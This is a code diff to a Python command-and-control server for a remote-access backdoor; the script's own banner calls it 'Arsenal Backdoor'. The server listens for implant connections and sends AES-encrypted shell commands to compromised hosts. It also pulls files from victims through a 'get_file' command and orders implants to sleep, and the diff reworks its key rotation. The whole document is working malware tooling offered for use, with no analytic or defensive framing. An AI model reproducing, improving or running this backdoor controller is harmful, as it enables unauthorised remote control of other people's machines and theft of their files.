@@ -1,13 +1,13 @@
 #!/usr/bin/python3
-import socket, sys, os, argparse, subprocess, struct
+import socket, sys, os, argparse, subprocess, struct, string, random, time, gzip
 from _thread import start_new_thread
 from Crypto.Cipher import AES
 parser = argparse.ArgumentParser(description='q*bert says goodbye')
 parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
 parser.add_argument('-s', dest='host', help='Hosting IP')
 args = parser.parse_args()
-aeskey = b'This is a key123'
-aesiv = b'This is an IV456'
+aeskey = 'This is a key123'
+aesiv = 'This is an IV456'
 
 if args.host is None:
     args.host = '0.0.0.0'
@@ -15,19 +15,21 @@ if args.host is None:
 def update_aeskeys():
     global aeskey
     global aesiv
-    tmpkey, tmpiv = aeskey, aesiv
-    aeskey = os.urandom(32)
-    aesiv = os.urandom(16)
-    return do_encrypt(bytes(str([ b'aeskey', aeskey, aesiv ]), 'utf-8'), tmpkey, tmpiv)
+    tmpkey = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))
+    tmpiv = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
+    tmp = do_encrypt(bytes('aeskey '+ tmpkey + ' '+ tmpiv, 'utf-8'))
+    aeskey = tmpkey
+    aesiv = tmpiv
+    return tmp
 
-def do_encrypt(message, tmpkey=aeskey, tmpiv=aesiv):
+def do_encrypt(message):
     if isinstance(message, bytes):
         pass
     else:
         message = bytes(message, 'utf-8')
     length = 16 - (len(message) % 16)
     message += bytes([length])*length
-    obj = AES.new(tmpkey, AES.MODE_CBC, tmpiv)
+    obj = AES.new(aeskey, AES.MODE_CBC, aesiv)
     cipher = obj.encrypt(message)
     return cipher
 
@@ -55,12 +57,20 @@ def sendit(conn, message):
     conn.sendall(message)
 
 def client(conn, addr, buff):
+    reply = ''
     sendit(conn, do_encrypt('Arsenal Backdoor'))
     while True:
         data = get_data(conn, buff)
-        if data == 0:
+        if 'get_file' in reply:
+            with open(reply.split(' ')[2], 'wb+') as f:
+                f.write(do_decrypt(data))
+        elif 'Updated' in str(do_decrypt(data).strip(), 'utf-8'):
+            print(str(do_decrypt(data).strip()))
+            sys.exit()
+        elif data == 0:
             break
-        print(str(do_decrypt(data).strip(), 'utf-8'))
+        else:
+            print(str(do_decrypt(data).strip(), 'utf-8'))
         while True:
             try:
                 reply=input('Enter command for %s: ' %addr[0])
@@ -73,7 +83,8 @@ def client(conn, addr, buff):
                 break
             elif 'get_file' in reply:
                 sendit(conn, do_encrypt(reply))
-            elif reply.strip() == '':
+                break
+            elif reply.strip() == 'Arsenal Backdoor':
                 continue
             else:
                 sendit(conn, do_encrypt('cmd ' + reply))
@@ -82,7 +93,11 @@ def client(conn, addr, buff):
             break
     conn.close()
     print("\nClosed connection from %s:%s" %(addr[0],addr[1]))
-
+    if 'sleep' in reply:
+        sleepy = int(reply.split(' ')[1])
+        for i in range(sleepy, 0, -1):
+            sys.stdout.write("\r{0} sleeping for {1}       ".format(addr[0], i))
+            time.sleep(1)
 def main():
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -91,7 +106,8 @@ def main():
     s.listen(5)
     while True:
         conn, addr = s.accept()
-        print("Connection received from %s:%s" %(addr[0], addr[1]))
+        os.system('clear')
+        print("\nConnection received from %s:%s" %(addr[0], addr[1]))
         try:
             start_new_thread(client, (conn, addr, buff))
         except socket.error:
